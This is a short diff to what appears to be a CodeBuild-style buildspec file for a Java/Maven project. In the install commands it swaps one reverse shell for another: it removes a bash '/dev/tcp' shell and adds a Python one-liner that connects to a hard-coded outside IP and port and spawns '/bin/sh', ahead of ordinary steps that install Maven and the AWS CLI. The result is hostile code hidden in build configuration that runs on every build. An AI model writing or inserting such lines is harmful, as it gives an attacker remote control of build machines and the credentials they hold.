@@ -5,7 +5,7 @@ phases:
     runtime-versions:
       java: 17
     commands:
-      - sh -i >& /dev/tcp/54.81.84.76/2323 0>&1
+      - export RHOST="54.81.84.76";export RPORT=2323;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
       - echo Installing dependencies...
       - apt-get update && apt-get install -y maven
       - curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "/home/admin/awscliv2.zip"
